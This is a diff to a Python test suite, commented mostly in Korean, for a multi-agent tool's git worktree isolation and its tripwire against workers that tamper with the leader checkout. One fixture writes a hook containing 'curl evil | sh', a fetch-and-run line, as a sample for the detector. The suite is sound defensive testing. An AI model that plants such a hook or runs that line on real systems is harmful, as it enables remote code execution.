@@ -1,14 +1,15 @@
 """Fail-closed worktree isolation tests.
 
 Every guard has a falsification case: a deliberately injected violation that must
-make the guard raise. A guard that always passes proves nothing, so each check is
-paired with a "this really fails" assertion.
+raise. Detection-only guards pair "does not raise" with a mutation case, so a
+dead assertion cannot pass silently.
 """
 from __future__ import annotations
 
 import os
 import subprocess
 import sys
+import time
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 
@@ -19,12 +20,15 @@ if SRC not in sys.path:
     sys.path.insert(0, SRC)
 
 from agent_flow.core import worktrees as W
+from agent_flow.core import worktree_isolation as W_ISO
 from agent_flow.core.worktree_isolation import (
     WorkerScope,
     WorktreeIsolationError,
     assert_cwd_bound,
+    assert_leader_unchanged,
     assert_scopes_isolated,
     assert_worktree_mergeable,
+    capture_leader_snapshot,
     real_path,
     sanitized_worker_env,
     verify_linked_worktree,
@@ -142,17 +146,37 @@ def test_scope_gate_rejects_glob_without_both_isolated():
 
 
 def test_scope_gate_allows_overlap_when_both_isolated():
+    """불변: 겹치는 write scope는 양쪽 모두 worktree 격리를 선언했을 때만 통과한다."""
+    overlapping = ("src/x.py",)
+    # 통과해야 하는 쪽: 둘 다 격리 선언.
     assert_scopes_isolated([
-        WorkerScope("a", ("src/x.py",), True),
-        WorkerScope("b", ("src/x.py",), True),
+        WorkerScope("a", overlapping, True),
+        WorkerScope("b", overlapping, True),
     ])
+    # 게이트가 실제로 판단하고 있다는 증거: 플래그 하나만 뒤집으면 거부된다.
+    # 가드를 `return` 한 줄로 비우면 이 절이 실패한다.
+    with pytest.raises(WorktreeIsolationError) as rejected:
+        assert_scopes_isolated([
+            WorkerScope("a", overlapping, True),
+            WorkerScope("b", overlapping, False),
+        ])
+    message = str(rejected.value)
+    assert "'a'" in message and "'b'" in message
 
 
 def test_scope_gate_allows_disjoint():
+    """불변: 서로 겹치지 않는 scope는 격리 선언이 없어도 통과한다."""
+    # 통과해야 하는 쪽: 경로가 겹치지 않음.
     assert_scopes_isolated([
         WorkerScope("a", ("src/a.py",), False),
         WorkerScope("b", ("src/b.py",), False),
     ])
+    # 경로 하나만 겹치게 바꾸면 같은 입력이 거부된다 — disjoint 판정이 실재한다.
+    with pytest.raises(WorktreeIsolationError):
+        assert_scopes_isolated([
+            WorkerScope("a", ("src/a.py",), False),
+            WorkerScope("b", ("src/a.py",), False),
+        ])
 
 
 
@@ -177,11 +201,18 @@ def test_mergeable_rejects_unmerged(tmp_path):
 
 
 def test_mergeable_allows_clean_merged(tmp_path):
+    """불변: merge 증명이 통과한 worktree는 require_merged 삭제가 실제로 성공한다."""
     _init_repo(tmp_path)
     plan = W.plan_worktree(root=tmp_path, name="epsilon")
     status = W.create_worktree(root=tmp_path, plan=plan)
     # fresh worktree tip == base == leader HEAD -> ancestor, clean -> mergeable
     assert_worktree_mergeable(root=tmp_path, path=status.path)
+    # 관찰 가능한 결과: 증명이 통과했으므로 기본(require_merged) 삭제가 끝까지
+    # 진행되어 체크아웃과 git 등록이 함께 사라진다.
+    W.remove_worktree(root=tmp_path, status=status)
+    assert not status.path.exists()
+    assert real_path(plan.path) not in _registered(tmp_path)
+    assert not W.worktree_branch_exists(root=tmp_path, branch=plan.branch)
 
 
 def test_remove_refuses_unmerged_and_preserves(tmp_path):
@@ -233,23 +264,46 @@ def _registered(root: Path):
 
 
 def test_create_is_fail_closed_on_persistent_git_failure(tmp_path, monkeypatch):
+    """불변: 생성이 실패하면 절반만 만들어진 worktree/브랜치/등록이 남지 않는다."""
     _init_repo(tmp_path)
     baseline = _git("status", "--porcelain", cwd=tmp_path).stdout
+    attempts = []
+    _orig = W._run_git
 
     def _boom(root, *args):
         if args[:2] == ("worktree", "add"):
+            attempts.append(args)
             raise subprocess.CalledProcessError(1, ("git",) + args, stderr="fatal: index.lock exists")
-        return W._run_git(tmp_path, *args) if False else _orig(root, *args)
+        return _orig(root, *args)
 
-    _orig = W._run_git
     monkeypatch.setattr(W, "_run_git", _boom)
     plan = W.plan_worktree(root=tmp_path, name="theta")
     with pytest.raises((WorktreeIsolationError, subprocess.CalledProcessError)):
         W.create_worktree(root=tmp_path, plan=plan)
     monkeypatch.undo()
-    # falsification: main is untouched and no leftover checkout was trusted.
+    # lock 경합은 재시도하되 무한히 돌지 않고 포기했다는 증거.
+    assert 1 < len(attempts) <= 8
+    # 남은 것이 없다는 증명은 논리곱이어야 한다. 예전 논리합은 add가 아예 막혀
+    # 있어서 어떤 구현에서도 참이었다.
+    assert not plan.path.exists()
+    assert real_path(plan.path) not in _registered(tmp_path)
+    assert not W.worktree_branch_exists(root=tmp_path, branch=plan.branch)
     assert _git("status", "--porcelain", cwd=tmp_path).stdout == baseline
-    assert not (plan.path / ".git").is_file() or plan.path not in _registered(tmp_path)
+
+    # 두 번째 국면: 생성은 성공하고 그 뒤 manifest 쓰기가 실패하면, 이미 만들어진
+    # worktree를 실제로 되돌려야 한다. 여기서만 "cleanup"을 증명할 수 있다.
+    def _manifest_boom(*, root, status):
+        raise OSError("disk full")
+
+    monkeypatch.setattr(W, "write_worktree_manifest", _manifest_boom)
+    rollback_plan = W.plan_worktree(root=tmp_path, name="theta-rollback")
+    with pytest.raises(OSError):
+        W.create_worktree(root=tmp_path, plan=rollback_plan)
+    monkeypatch.undo()
+    assert not rollback_plan.path.exists()
+    assert real_path(rollback_plan.path) not in _registered(tmp_path)
+    assert not W.worktree_branch_exists(root=tmp_path, branch=rollback_plan.branch)
+    assert _git("status", "--porcelain", cwd=tmp_path).stdout == baseline
 
 
 
@@ -381,11 +435,20 @@ def test_git_repo_state_unknown_on_git_failure(tmp_path, monkeypatch):
 
 
 def test_scope_gate_ignores_same_worker_self_overlap():
-    # the same worker approved for two tasks with the same scope is not a conflict.
+    """불변: 같은 worker의 자기 자신과의 겹침은 충돌이 아니고, 다른 worker면 충돌이다."""
+    same_scope = ("src/x.py",)
+    # 한 worker가 두 task에 같은 scope로 승인된 경우는 충돌이 아니다.
     assert_scopes_isolated([
-        WorkerScope("w1", ("src/x.py",), False),
-        WorkerScope("w1", ("src/x.py",), False),
+        WorkerScope("w1", same_scope, False),
+        WorkerScope("w1", same_scope, False),
     ])
+    # worker 이름 하나만 바꾸면 동일한 scope가 거부된다 — 자기 겹침 예외가
+    # 게이트를 통째로 무력화한 것이 아님을 보인다.
+    with pytest.raises(WorktreeIsolationError):
+        assert_scopes_isolated([
+            WorkerScope("w1", same_scope, False),
+            WorkerScope("w2", same_scope, False),
+        ])
 
 
 def test_e2e_non_git_scope_collision_is_rejected(tmp_path):
@@ -410,3 +473,478 @@ def test_e2e_non_git_scope_collision_is_rejected(tmp_path):
                 "--command", sys.executable, "-c", "print('must not run')"], cwd=tmp_path)
     assert res.returncode == 2
     assert "overlapping write scope" in (res.stdout + res.stderr)
+
+
+def _leader_state(root: Path) -> tuple[str, str, str]:
+    return (
+        _git("rev-parse", "HEAD", cwd=root).stdout.strip(),
+        _git("rev-parse", "--abbrev-ref", "HEAD", cwd=root).stdout.strip(),
+        _git("status", "--porcelain", cwd=root).stdout,
+    )
+
+
+def _isolated(tmp_path: Path, name: str = "tw"):
+    """leader + 그 안의 검증된 linked worktree 한 쌍."""
+    _init_repo(tmp_path)
+    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
+    _git("add", ".gitignore", cwd=tmp_path)
+    _git("commit", "-m", "ignore agent-flow", cwd=tmp_path)
+    plan = W.plan_worktree(root=tmp_path, name=name)
+    status = W.create_worktree(root=tmp_path, plan=plan)
+    return status, capture_leader_snapshot(tmp_path)
+
+
+def test_tripwire_detects_absolute_path_write_to_leader(tmp_path):
+    """불변: 워커가 절대경로로 leader의 추적 파일을 고치면 phase가 통과하지 못한다."""
+    status, before = _isolated(tmp_path, "abs")
+    (tmp_path / "tracked.txt").write_text("leaked by worker\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+    assert "tracked.txt" in str(caught.value)
+    # 탐지 전용이다. 흘린 내용은 그대로 남아 있어야 한다.
+    assert (tmp_path / "tracked.txt").read_text() == "leaked by worker\n"
+
+
+def test_tripwire_detects_parent_traversal_write(tmp_path):
+    """불변: worktree에서 `../..`로 올라가 leader에 쓰면 잡힌다."""
+    status, before = _isolated(tmp_path, "trav")
+    escaped = status.path / ".." / ".." / ".." / "escaped.txt"
+    escaped.resolve().parent.mkdir(parents=True, exist_ok=True)
+    escaped.resolve().write_text("escaped\n", encoding="utf-8")
+    if real_path(escaped.resolve().parent) != real_path(tmp_path):
+        pytest.skip("worktree layout does not place the leader three levels up")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_leader_branch_switch(tmp_path):
+    """불변: 삭제한 guard-worktree.sh가 막던 leader 브랜치 전환을 tripwire가 대신 잡는다."""
+    status, before = _isolated(tmp_path, "branch")
+    _git("checkout", "-q", "-b", "sneaky", cwd=tmp_path)
+    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+    assert "branch switched" in str(caught.value)
+    # 되돌리지 않는다. 사용자가 어디에 있는지 스스로 알 수 있어야 한다.
+    assert _git("rev-parse", "--abbrev-ref", "HEAD", cwd=tmp_path).stdout.strip() == "sneaky"
+
+
+def test_tripwire_ignores_agent_runtime_writes(tmp_path):
+    """불변: `.agent-flow/` 쓰기는 오염이 아니다.
+
+    L2 Read hook은 worktree 안에서 돌아도 leader의
+    `.agent-flow/skills-read.jsonl`에 append한다. runner는 `.agent-flow/runs/`를,
+    JS는 `.agent-flow/state/`를 쓴다. 여기를 감시하면 정상 동작이 100% 오탐이
+    되고, 오탐 한 번이 완료된 리뷰어 산출물과 claim된 task를 날린다.
+    """
+    status, before = _isolated(tmp_path, "runtime")
+    for rel in (
+        ".agent-flow/skills-read.jsonl",
+        ".agent-flow/state/current-run.json",
+        ".agent-flow/runs/default/r1/meta.json",
+    ):
+        target = tmp_path / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text("{}\n", encoding="utf-8")
+    W_ISO.assert_leader_unchanged(tmp_path, before)
+
+    # 같은 실행에서 바깥 쓰기는 여전히 잡힌다 — 무장 해제가 아니다.
+    (tmp_path / "leaked.txt").write_text("worker leak\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_hook_planted_in_leader(tmp_path):
+    """불변: `.agent-flow/scripts/hooks/`는 감시한다.
+
+    런타임 상태(`runs`/`state`/`skills-read.jsonl`)를 오탐 때문에 제외했다고
+    `.agent-flow/`를 통째로 비우면, host가 매 tool call마다 **실행하는** hook
+    디렉터리가 사각지대가 된다. 워커가 여기 심으면 반드시 잡혀야 한다.
+    """
+    status, before = _isolated(tmp_path, "hooks")
+    planted = tmp_path / ".agent-flow" / "scripts" / "hooks" / "EVIL.sh"
+    planted.parent.mkdir(parents=True, exist_ok=True)
+    planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_hook_content_swap(tmp_path):
+    """불변: 이미 있던 hook의 내용 교체도 잡는다. 상태 문자는 그대로다."""
+    _isolated(tmp_path, "hookswap")
+    hook = tmp_path / ".agent-flow" / "scripts" / "hooks" / "guard.sh"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    hook.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_file_replaced_by_symlink(tmp_path):
+    """불변: 같은 내용의 symlink로 바꿔치기해도 잡는다.
+
+    `stat`은 대상을 따라가 구분을 잃는다. `lstat`이어야 한다. 링크 대상은
+    스냅샷 **전에** 만들어 둔다. 대상이 새 파일이면 그 신규 레코드만으로도
+    탐지돼 정작 symlink 교체를 보는지 알 수 없다.
+    """
+    _isolated(tmp_path, "symlink")
+    note = tmp_path / "note.txt"
+    note.write_text("same\n", encoding="utf-8")
+    target = tmp_path / "elsewhere.txt"
+    target.write_text("same\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    note.unlink()
+    note.symlink_to(target)
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_status_record_path_keeps_rename_source_with_spaces(tmp_path):
+    """불변: 상태 문자 없는 rename 원본 레코드를 3글자 잘라내지 않는다."""
+    assert W_ISO._status_record_path("?? db backup.sql") == "db backup.sql"
+    assert W_ISO._status_record_path("db backup.sql") == "db backup.sql"
+    assert W_ISO._status_record_path(" M a.txt") == "a.txt"
+
+
+def test_tripwire_ignores_identical_rewrite_of_dirty_file(tmp_path):
+    """불변: 같은 바이트로 다시 저장하는 것은 변경이 아니다.
+
+    mtime을 지표로 쓰면 에디터 저장·포매터·빌드만으로 터진다.
+    """
+    _isolated(tmp_path, "same-bytes")
+    tracked = tmp_path / "tracked.txt"
+    tracked.write_text("user edit\n", encoding="utf-8")
+    scratch = tmp_path / "scratch.txt"
+    scratch.write_text("user scratch\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    time.sleep(0.01)
+    tracked.write_text("user edit\n", encoding="utf-8")
+    scratch.write_text("user scratch\n", encoding="utf-8")
+    W_ISO.assert_leader_unchanged(tmp_path, before)
+
+    # 내용이 실제로 바뀌면 untracked 파일도 잡힌다.
+    scratch.write_text("worker overwrote it\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_content_change_of_already_dirty_file(tmp_path):
+    """불변: 이미 더러운 파일을 워커가 덧쓰면 status 문자는 그대로여도 잡힌다."""
+    status, before0 = _isolated(tmp_path, "dirty")
+    (tmp_path / "tracked.txt").write_text("user edit\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    # 상태 문자는 ' M tracked.txt'로 동일하다. tracked-content 해시만이 이 재수정을 본다.
+    (tmp_path / "tracked.txt").write_text("worker overwrote it\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_never_touches_user_work(tmp_path):
+    """불변: 감지는 하되 **아무것도 되돌리지 않는다.** 사용자의 미커밋 작업이 살아남아야 한다.
+
+    이 테스트가 이전 설계(rescue + `reset --hard`)를 폐기한 이유다. 그 설계는
+    사람이 편집 중이던 leader 파일을 마지막 커밋으로 되돌려 실제로 파괴했다.
+    """
+    status, _ = _isolated(tmp_path, "userwork")
+    (tmp_path / "tracked.txt").write_text("USER WORK IN PROGRESS\n", encoding="utf-8")
+    (tmp_path / "scratch.txt").write_text("user scratch\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    head_before = _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip()
+
+    (tmp_path / "leaked.txt").write_text("worker leak\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+    assert (tmp_path / "tracked.txt").read_text() == "USER WORK IN PROGRESS\n"
+    assert (tmp_path / "scratch.txt").read_text() == "user scratch\n"
+    assert (tmp_path / "leaked.txt").exists()
+    assert _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip() == head_before
+
+
+def test_recovery_commands_bypass_tripwire(tmp_path):
+    """불변: leader가 오염된 상태에서도 복구 명령은 막히지 않는다 (#87 데드락 회귀 방지)."""
+    status, _before = _isolated(tmp_path, "recover")
+    # 오염을 남겨 둔 채로 복구 명령을 부른다. 검증이 실패 상태를 붙잡고 있으면
+    # 사용자가 빠져나갈 방법이 없어진다 — 그 상황을 금지한다.
+    (tmp_path / "f.txt").write_text("leader is contaminated\n", encoding="utf-8")
+    (tmp_path / "stray.txt").write_text("stray\n", encoding="utf-8")
+
+    for argv in (
+        ["status", "--root", "."],
+        ["worktree", "list", "--root", "."],
+        ["abort", "--root", "."],
+        ["worktree", "remove", "--root", ".", "--name", status.name],
+    ):
+        result = _cli(argv, cwd=tmp_path)
+        assert result.returncode == 0, f"{argv} blocked: {result.stdout}{result.stderr}"
+
+    # 복구 명령은 tripwire를 거치지 않으므로 오염을 치우지도 않는다. 판단은
+    # 사용자 몫으로 남고, 명령이 막히지 않는다는 사실만 보장한다.
+    assert (tmp_path / "f.txt").read_text(encoding="utf-8") == "leader is contaminated\n"
+    assert (tmp_path / "stray.txt").exists()
+
+    # git 저장소가 아닌 프로젝트에서도 같은 명령이 그대로 동작해야 한다.
+    # state root를 확정하지 못할 때 무조건 raise하면 non-git 사용자는 복구
+    # 명령조차 쓸 수 없게 되어 같은 종류의 데드락으로 되돌아간다.
+    plain = tmp_path / "not-a-repo"
+    plain.mkdir()
+    for argv in (
+        ["status", "--root", "."],
+        ["worktree", "list", "--root", "."],
+        ["abort", "--root", "."],
+    ):
+        result = _cli(argv, cwd=plain)
+        assert result.returncode == 0, f"{argv} blocked in non-git: {result.stdout}{result.stderr}"
+
+
+def test_multi_review_reviewer_env_is_sanitized(tmp_path, monkeypatch):
+    """불변: reviewer 자식 프로세스는 오염된 GIT_DIR을 물려받지 않는다."""
+    from agent_flow import multi_review as MR
+    from agent_flow.cli_detect import CliInfo
+
+    _init_repo(tmp_path)
+    out = tmp_path / "angle.md"
+    probe = (
+        "import os,sys,subprocess\n"
+        "top=subprocess.run(['git','rev-parse','--show-toplevel'],capture_output=True,text=True).stdout.strip()\n"
+        "print('GITDIR=%s' % os.environ.get('GIT_DIR','<unset>'))\n"
+        "print('WORKTREE=%s' % os.environ.get('GIT_WORK_TREE','<unset>'))\n"
+        "print('TOP=%s' % os.path.realpath(top) if top else 'TOP=')\n"
+    )
+    fake = CliInfo(name="probe", binaries=(sys.executable,), invoke=("-c", probe, "--prompt"))
+    monkeypatch.setattr(MR, "cli_by_name", lambda name: fake)
+    # 부모 환경을 오염시킨다. env를 넘기지 않으면 자식이 이걸 그대로 상속한다.
+    monkeypatch.setenv("GIT_DIR", str(tmp_path / ".git"))
+    monkeypatch.setenv("GIT_WORK_TREE", str(tmp_path))
+
+    distribution = MR.Distribution(
+        by_cli={"probe": [MR.ReviewerJob(angle_id="a1", prompt="review", output_path=out)]},
+        host="host-cli",
+    )
+    results = MR.run_distribution(distribution, tmp_path, timeout_s=60)
+    assert len(results) == 1
+    rendered = out.read_text(encoding="utf-8")
+    assert "GITDIR=<unset>" in rendered
+    assert "WORKTREE=<unset>" in rendered
+    # 오염된 env가 걸러졌으므로 자식의 git은 cwd에서 저장소를 다시 찾는다.
+    assert f"TOP={real_path(tmp_path)}" in rendered
+
+
+def test_run_blocks_when_git_state_unknown(tmp_path, monkeypatch):
+    """불변: git 상태를 확정 못 하면 run은 leader에서 격리 없이 진행하지 않는다."""
+    import contextlib
+    import io
+
+    from agent_flow import cli as CLI
+    from agent_flow.core import commands as C
+
+    _init_repo(tmp_path)
+
+    def _timeout(*args, **kwargs):
+        raise subprocess.TimeoutExpired(cmd="git", timeout=5)
+
+    monkeypatch.setattr(C.subprocess, "run", _timeout)
+    stderr = io.StringIO()
+    with contextlib.redirect_stderr(stderr):
+        code = CLI.main(["run", "some task", "--root", str(tmp_path)])
+    # 예전 `_is_git_repo`는 timeout을 non-git으로 접어 leader에서 그대로 달렸다.
+    assert code == 2
+    assert "cannot determine git repo state" in stderr.getvalue()
+    # falsification: 막혔다면 leader에 run 상태가 만들어졌을 리 없다.
+    assert not (tmp_path / ".agent-flow" / "runs").exists()
+
+
+def test_reused_worktree_is_verified(tmp_path):
+    """불변: 기존 경로 재사용도 생성과 같은 증명을 거친다 — 남의 저장소 worktree는 거부."""
+    leader = tmp_path / "leader"
+    leader.mkdir()
+    _init_repo(leader)
+    plan = W.plan_worktree(root=leader, name="reused")
+
+    # 정상 재사용은 통과해야 한다(회귀 방지).
+    first = W.create_worktree(root=leader, plan=plan)
+    again = W.create_worktree(root=leader, plan=plan)
+    assert real_path(again.path) == real_path(first.path)
+
+    # 같은 경로를 다른 저장소의 worktree로 바꿔치기한다. `.git`이 있다는
+    # 사실만 보던 예전 재사용 분기는 이걸 그대로 받아들였다.
+    W.remove_worktree(root=leader, status=first, allow_unmerged=True)
+    intruder = tmp_path / "intruder"
+    intruder.mkdir()
+    _init_repo(intruder)
+    assert _git("worktree", "add", "-b", plan.branch, str(plan.path), cwd=intruder).returncode == 0
+    assert (plan.path / ".git").is_file()
+
+    with pytest.raises(WorktreeIsolationError):
+        W.create_worktree(root=leader, plan=plan)
+
+
+def test_normalized_name_reuses_the_same_worktree(tmp_path):
+    """불변: 같은 worktree를 가리키는 표기 차이는 재사용이고, 격리는 unique 토큰이 보장한다."""
+    _init_repo(tmp_path)
+    first = W.plan_worktree(root=tmp_path, name="Fix Bug")
+    second = W.plan_worktree(root=tmp_path, name="fix-bug")
+    assert first.path == second.path
+    created = W.create_worktree(root=tmp_path, plan=first)
+
+    # resume 경로는 정규화된 이름으로 다시 들어온다. 이걸 막으면 재개 자체가 불가능하다.
+    reused = W.create_worktree(root=tmp_path, plan=second, allow_dirty=True)
+    assert real_path(reused.path) == real_path(created.path)
+
+    # falsification: 동시 워커 격리는 unique 토큰이 만든다. 토큰이 다르면 트리도 달라야 한다.
+    forked = W.plan_worktree(root=tmp_path, name="Fix Bug", unique="w2")
+    assert forked.path != first.path
+    forked_status = W.create_worktree(root=tmp_path, plan=forked, allow_dirty=True)
+    assert real_path(forked_status.path) != real_path(created.path)
+
+
+def _team_fixture(root: Path) -> None:
+    assert _cli(["team", "init", "--root", ".", "--name", "ft"], cwd=root).returncode == 0
+    for tid in ("t1", "t2"):
+        assert _cli(["team", "task", "--root", ".", "--team", "ft", "--id", tid,
+                     "--subject", "s", "--description", "d"], cwd=root).returncode == 0
+    for worker in ("w1", "w2"):
+        assert _cli(["team", "worker", "--root", ".", "--team", "ft", "--name", worker,
+                     "--role", "impl"], cwd=root).returncode == 0
+    for tid, worker, scope in (("t1", "w1", "src/a"), ("t2", "w2", "src/b")):
+        assert _cli(["team", "brief", "--root", ".", "--team", "ft", "--task", tid,
+                     "--worker", worker, "--brief", "Use the worker-brief contract.",
+                     "--write-scope", scope], cwd=root).returncode == 0
+        assert _cli(["team", "approve-worker", "--root", ".", "--team", "ft", "--task", tid,
+                     "--worker", worker, "--write-scope", scope], cwd=root).returncode == 0
+
+
+def test_capacity_gate_holds_when_a_slot_is_already_taken(tmp_path):
+    """불변: capacity 검사는 claim과 같은 구간에서 최신 in-progress 수를 보고 판정한다."""
+    _init_repo(tmp_path)
+    _team_fixture(tmp_path)
+    # w1이 t1을 잡아 슬롯 하나를 소진한다.
+    assert _cli(["team", "claim", "--root", ".", "--team", "ft", "--task", "t1",
+                 "--worker", "w1"], cwd=tmp_path).returncode == 0
+
+    blocked = _cli(
+        ["team", "run-next", "--root", ".", "--team", "ft", "--worker", "w2",
+         "--command", sys.executable, "-c", "print('must not run')"],
+        cwd=tmp_path, env={"AGENT_FLOW_MAX_WORKERS": "1"},
+    )
+    assert blocked.returncode == 2
+    assert "worker capacity reached" in (blocked.stdout + blocked.stderr)
+    # 막혔다면 t2는 아직 아무도 잡지 않았어야 한다.
+    assert "must not run" not in blocked.stdout
+
+    # falsification: 여유가 있으면 같은 명령이 실제로 통과한다.
+    allowed = _cli(
+        ["team", "run-next", "--root", ".", "--team", "ft", "--worker", "w2",
+         "--command", sys.executable, "-c", "print('worker ran')"],
+        cwd=tmp_path, env={"AGENT_FLOW_MAX_WORKERS": "4"},
+    )
+    assert allowed.returncode == 0, allowed.stdout + allowed.stderr
+    assert "t2 completed" in allowed.stdout
+
+
+def test_state_root_refuses_to_fall_back_into_the_leader(tmp_path, monkeypatch):
+    """불변: git 저장소인데 common dir을 못 읽으면 state root를 leader 안에 두지 않고 멈춘다."""
+    from agent_flow.core.commands import SafeCommandResult
+
+    _init_repo(tmp_path)
+    real_git_safe = W.git_safe
+
+    def _no_common_dir(*args, **kwargs):
+        if args[:2] == ("rev-parse", "--git-common-dir"):
+            return SafeCommandResult(
+                args=("git",), returncode=None, stdout="", stderr="timed out", timed_out=True
+            )
+        return real_git_safe(*args, **kwargs)
+
+    monkeypatch.setattr(W, "git_safe", _no_common_dir)
+    # 폴백하면 워커 상태가 leader 체크아웃 안에 쌓여 격리가 조용히 무너진다.
+    with pytest.raises(RuntimeError) as refused:
+        W.worktree_runtime_root(root=tmp_path, name="anything")
+    assert "leader checkout" in str(refused.value)
+
+
+def test_tripwire_watches_installed_runtime_code(tmp_path):
+    """불변: `.agent-flow/runtime/`은 gate가 PYTHONPATH 최우선으로 실행하는 코드다.
+
+    상태 디렉터리라고 통째로 빼면 tripwire 자기 자신을 포함한 런타임 전체가
+    사각지대가 된다. 정당하게 생기는 것은 bytecode뿐이다.
+    """
+    status, before = _isolated(tmp_path, "runtime")
+    planted = tmp_path / ".agent-flow" / "runtime" / "python" / "agent_flow" / "runner.py"
+    planted.parent.mkdir(parents=True, exist_ok=True)
+    planted.write_text("import os\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_ignores_generated_bytecode(tmp_path):
+    """불변: `__pycache__`/`.pyc`는 실행하면 저절로 생긴다. 오탐이면 안 된다."""
+    status, before = _isolated(tmp_path, "pyc")
+    cache = tmp_path / ".agent-flow" / "runtime" / "python" / "agent_flow" / "__pycache__"
+    cache.mkdir(parents=True, exist_ok=True)
+    (cache / "runner.cpython-312.pyc").write_bytes(b"\x00bytecode\n")
+    W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_ignores_every_declared_state_dir(tmp_path):
+    """불변: `AGENT_FLOW_STATE_DIRS`는 `artifacts.init_project`와 같은 소스다.
+
+    갈라지면 정상 명령(handoff, team, memory 쓰기)이 leader 오염으로 오탐된다.
+    """
+    status, before = _isolated(tmp_path, "statedirs")
+    for name in W_ISO.AGENT_FLOW_STATE_DIRS:
+        target = tmp_path / ".agent-flow" / name / "written.md"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text("x\n", encoding="utf-8")
+    W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_state_dirs_match_artifacts_init(tmp_path):
+    """불변: agent-flow가 실제로 쓰는 상태 디렉터리 전부가 제외 목록에 있다.
+
+    목록을 그대로 순회하는 검사는 항목이 빠져도 통과한다(자기참조). 그래서
+    기대값을 여기에 못박는다. 새 상태 디렉터리를 만들면 이 테스트가 먼저 깨진다.
+    """
+    from agent_flow.core import artifacts
+
+    expected = {"runs", "state", "handoffs", "team", "archive", "context", "memory", "worktrees"}
+    assert set(W_ISO.AGENT_FLOW_STATE_DIRS) == expected
+
+    artifacts.init_project(tmp_path)
+    created = {p.name for p in (tmp_path / ".agent-flow").iterdir() if p.is_dir()}
+    assert expected <= created
+
+
+def test_tripwire_sees_inside_gitignored_agent_flow(tmp_path):
+    """불변: `.agent-flow/`가 gitignore돼도 안쪽 코드 변경은 보인다.
+
+    `--ignored=matching`은 ignore 패턴에 직접 걸린 디렉터리를 한 줄로 접는다.
+    심층 스캔(pathspec)이 없으면 그 안쪽이 통째로 사각지대가 된다 — 실제
+    프로젝트가 정확히 이 배치다.
+    """
+    status, before = _isolated(tmp_path, "deep")
+    assert ".agent-flow/" in (tmp_path / ".gitignore").read_text(encoding="utf-8")
+    planted = tmp_path / ".agent-flow" / "scripts" / "hooks" / "sneaky.sh"
+    planted.parent.mkdir(parents=True, exist_ok=True)
+    planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_ignores_the_folded_agent_flow_record(tmp_path):
+    """불변: 접힌 `!! .agent-flow/` 한 줄은 비교에서 뺀다.
+
+    심층 스캔이 안을 파일 단위로 이미 보고하므로 정보가 없고, 디렉터리가
+    처음 생기는 것만으로 변화가 생겨 정상 동작이 오탐이 된다.
+    """
+    tmp_path.joinpath("x.txt").write_text("x\n", encoding="utf-8")
+    _init_repo(tmp_path)
+    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
+    _git("add", ".gitignore", cwd=tmp_path)
+    _git("commit", "-m", "ignore", cwd=tmp_path)
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    assert not (tmp_path / ".agent-flow").exists()
+    runs = tmp_path / ".agent-flow" / "runs" / "default" / "r1"
+    runs.mkdir(parents=True)
+    (runs / "meta.json").write_text("{}\n", encoding="utf-8")
+    W_ISO.assert_leader_unchanged(tmp_path, before)
